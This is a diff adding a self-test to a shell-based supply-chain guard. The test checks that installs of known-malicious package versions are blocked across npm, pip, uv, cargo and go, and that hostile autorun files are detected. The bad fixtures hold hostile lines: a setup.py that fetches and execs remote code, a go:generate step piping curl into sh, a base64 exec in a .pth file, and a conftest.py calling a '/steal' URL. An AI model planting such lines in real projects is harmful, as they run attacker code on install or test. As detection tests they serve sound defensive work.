@@ -233,6 +233,7 @@ JSON
   _st_never_delete
   _st_agents_consent
   _st_allow_incoming
+  _st_deps
   _st_shield_fallback
 
   if [ "$keep" = 1 ]; then dim "  kept: $T"; else rm -rf "$T"; fi
@@ -1359,5 +1360,116 @@ _st_allow_incoming(){
   else _st_bad "a blocked clone is approvable by its URL (rc=$rc)"; fi
 
   SNARE_HOME="$_h"; SNARE_LOGS="$_l"; GATE_LOG="$_g"; GATE_PENDING="$_p"; GATE_ALLOW="$_a"; GATE_CACHE="$_c"
+  rm -rf "$D"
+}
+
+# Known-malicious package versions, every ecosystem: the list builder, the
+# lockfile and install readers, the gate on install commands, the autorun
+# files other languages run on their own, and a list download cut short.
+_st_deps(){
+  local D; D="$(mktemp -d "${TMPDIR:-/tmp}/snaresd.XXXXXX")" || return 0
+  D="$(cd "$D" && pwd -P)"
+  local SNARE_NO_NOTIFY=1; export SNARE_NO_NOTIFY
+  local _h="$SNARE_HOME" _l="$SNARE_LOGS" _g="$GATE_LOG" _p="$GATE_PENDING" _a="$GATE_ALLOW" _c="$GATE_CACHE"
+  local _il="$INTEL_LIST" _im="$INTEL_META" _id="$INTEL_DIR" _iu="$INTEL_URL"
+  SNARE_HOME="$D/.snare"; SNARE_LOGS="$SNARE_HOME/logs"; GATE_LOG="$SNARE_LOGS/gate.log"
+  GATE_PENDING="$SNARE_LOGS/gate-pending"; GATE_ALLOW="$SNARE_HOME/gate-allow"; GATE_CACHE="$SNARE_HOME/gate-cache"
+  INTEL_DIR="$SNARE_HOME/intel"; INTEL_LIST="$INTEL_DIR/malicious.tsv.gz"; INTEL_META="$INTEL_DIR/intel.json"
+  mkdir -p "$SNARE_LOGS"
+  _sdm(){ # eco dir name versions|ALL id
+    mkdir -p "$D/mp/osv/malicious/$2"
+    local aff; if [ "$4" = ALL ]; then aff='"ranges":[{"type":"SEMVER","events":[{"introduced":"0"}]}]'; else aff="\"versions\":$4"; fi
+    printf '{"id":"%s","affected":[{"package":{"ecosystem":"%s","name":"%s"},%s}]}\n' "$5" "$1" "$3" "$aff" > "$D/mp/osv/malicious/$2/$5.json"
+  }
+  _sdm npm npm evil-pkg ALL MAL-1; _sdm npm npm ua-hijack '["0.7.29"]' MAL-2
+  _sdm PyPI pypi litellm '["1.107.0"]' MAL-3; _sdm crates.io crates.io evil_crate ALL MAL-5
+  _sdm Go go github.com/evil/mod '["v1.0.1"]' MAL-6
+  printf '{"id":"MAL-8","withdrawn":"2026-01-01","affected":[{"package":{"ecosystem":"npm","name":"retracted"},"versions":["1.0.0"]}]}\n' > "$D/mp/osv/malicious/npm/MAL-8.json"
+  python3 "$SNARE_ROOT/scripts/build-intel.py" "$D/mp" "$D/pub" >/dev/null 2>&1
+  local n; n="$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1]))["entries"])' "$D/pub/intel.json" 2>/dev/null)"
+  if [ "$n" = 5 ]; then _st_ok "the list builder condenses OSV records and drops withdrawn ones"
+  else _st_bad "the list builder condenses OSV records and drops withdrawn ones (entries=$n)"; fi
+
+  # download: a whole list is taken; one that fails its checksum is refused
+  INTEL_URL="file://$D/pub"
+  local ok1=0 ok2=0
+  snare_intel_refresh && [ -s "$INTEL_LIST" ] && ok1=1
+  printf 'cut short' > "$D/pub/malicious.tsv.gz"
+  local before; before="$(shasum -a 256 "$INTEL_LIST" | cut -d' ' -f1)"
+  snare_intel_refresh || [ "$(shasum -a 256 "$INTEL_LIST" | cut -d' ' -f1)" = "$before" ] && ok2=1
+  if [ "$ok1$ok2" = 11 ]; then _st_ok "a list download that fails its checksum is refused and the old list kept"
+  else _st_bad "a list download that fails its checksum is refused and the old list kept ($ok1$ok2)"; fi
+
+  # install commands, every ecosystem
+  local c bad="" good=""
+  while IFS= read -r c; do [ -n "$c" ] && ! _gate_decide "$c" "$D" >/dev/null 2>&1 || bad="$bad | $c"; done <<'CMDS'
+npm i evil-pkg@1.0.0
+npx evil-pkg
+pip install litellm==1.107.0
+python3 -m pip install 'litellm==1.107.0'
+uv add litellm==1.107.0
+cargo add evil_crate
+go get github.com/evil/mod@v1.0.1
+CMDS
+  [ -z "$bad" ] && _st_ok "installing a known-malicious version is stopped — npm, npx, pip, uv, cargo, go" \
+               || _st_bad "installing a known-malicious version is stopped —$bad"
+  while IFS= read -r c; do [ -n "$c" ] && _gate_decide "$c" "$D" >/dev/null 2>&1 || good="$good | $c"; done <<'CMDS'
+pip install litellm==1.106.0
+npm i left-pad@1.3.0
+go get github.com/evil/mod@v1.0.2
+CMDS
+  [ -z "$good" ] && _st_ok "a version that is not listed installs normally" \
+                || _st_bad "a version that is not listed installs normally —$good"
+
+  # unpinned, some versions bad: what would install decides
+  _deps_resolve_latest(){ echo "$_ST_LATEST"; }
+  local r1 r2 r3
+  _ST_LATEST=0.7.29; _gate_decide "npm i ua-hijack" "$D" >/dev/null 2>&1; r1=$?
+  _ST_LATEST=0.7.30; _gate_decide "npm i ua-hijack" "$D" >/dev/null 2>&1; r2=$?
+  _ST_LATEST="";     _gate_decide "npm i ua-hijack" "$D" >/dev/null 2>&1; r3=$?
+  unset -f _deps_resolve_latest; . "$SNARE_ROOT/lib/deps.sh"
+  INTEL_DIR="$SNARE_HOME/intel"; INTEL_LIST="$INTEL_DIR/malicious.tsv.gz"; INTEL_META="$INTEL_DIR/intel.json"
+  if [ "$r1$r2$r3" = 101 ]; then _st_ok "an unpinned install is stopped only when the version it would get is listed (or cannot be told)"
+  else _st_bad "an unpinned install is stopped only when the version it would get is listed (r=$r1$r2$r3)"; fi
+
+  # a repository's lockfile, and a requirements file on the command line
+  mkdir -p "$D/web"; printf '{"lockfileVersion":3,"packages":{"node_modules/ua-hijack":{"version":"0.7.29"}}}\n' > "$D/web/package-lock.json"
+  printf '{"name":"web"}\n' > "$D/web/package.json"
+  ( cd "$D/web" && git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1
+  printf 'litellm==1.107.0\n' > "$D/req.txt"
+  local out1 rq; out1="$(_gate_decide "npm install" "$D/web" 2>&1)"; local rl=$?
+  _gate_decide "pip install -r req.txt" "$D" >/dev/null 2>&1; rq=$?
+  if [ "$rl" = 1 ] && printf '%s' "$out1" | _qmatch "package-lock.json" && [ "$rq" = 1 ]; then
+    _st_ok "a lockfile or requirements file carrying a listed version is stopped, with where"
+  else _st_bad "a lockfile or requirements file carrying a listed version is stopped, with where (rl=$rl rq=$rq)"; fi
+  local fp; fp="$(_gate_allow_scan "$D/web" | awk -F'\t' '/ua-hijack/{print $6; exit}')"
+  [ -n "$fp" ] && _gate_allow_record "$fp" "$D/web" package-lock.json test
+  if [ -n "$fp" ] && _gate_decide "npm install" "$D/web" >/dev/null 2>&1; then
+    _st_ok "a wrong list entry in a lockfile can be approved with snare gate allow"
+  else _st_bad "a wrong list entry in a lockfile can be approved with snare gate allow"; fi
+
+  # files other languages run on their own
+  mkdir -p "$D/ar/ok" "$D/ar/bad"
+  printf 'import subprocess\nsubprocess.check_call(["cmake", ".."])\nfrom setuptools import setup\nsetup(name="x")\n' > "$D/ar/ok/setup.py"
+  printf 'fn main() { cc::Build::new().file("a.c").compile("a"); }\n' > "$D/ar/ok/build.rs"
+  printf 'package x\n//go:generate stringer -type=Pill\n' > "$D/ar/ok/gen.go"
+  printf 'import coverage; coverage.process_startup()\n' > "$D/ar/ok/cov.pth"
+  printf 'import urllib.request\nexec(urllib.request.urlopen("http://1.2.3.4/p").read())\n' > "$D/ar/bad/setup.py"
+  printf 'fn main() { std::process::Command::new("curl").arg("http://x").status().unwrap(); }\n' > "$D/ar/bad/build.rs"
+  printf 'package x\n//go:generate sh -c "curl -s http://x | sh"\n' > "$D/ar/bad/gen.go"
+  printf 'import os, base64; exec(base64.b64decode("cHJpbnQoMSk="))\n' > "$D/ar/bad/cook.pth"
+  printf 'import requests\nrequests.get("http://x/steal")\n' > "$D/ar/bad/conftest.py"
+  local ok_out bad_out
+  ok_out="$(_gate_tree "$D/ar/ok" fresh)"; local rok=$?
+  [ "$rok" = 0 ] || printf '%s\n' "$ok_out" >&2
+  bad_out="$(_gate_tree "$D/ar/bad" fresh)"
+  local miss=""
+  for f in setup.py build.rs gen.go cook.pth conftest.py; do printf '%s' "$bad_out" | _qmatch "$f:" || miss="$miss $f"; done
+  if [ "$rok" = 0 ] && [ -z "$miss" ]; then
+    _st_ok "setup.py, conftest.py, build.rs, go:generate and .pth payloads are caught; ordinary ones are not"
+  else _st_bad "setup.py, conftest.py, build.rs, go:generate and .pth payloads are caught; ordinary ones are not (ok=$rok missed:$miss)"; fi
+
+  SNARE_HOME="$_h"; SNARE_LOGS="$_l"; GATE_LOG="$_g"; GATE_PENDING="$_p"; GATE_ALLOW="$_a"; GATE_CACHE="$_c"
+  INTEL_LIST="$_il"; INTEL_META="$_im"; INTEL_DIR="$_id"; INTEL_URL="$_iu"
   rm -rf "$D"
 }
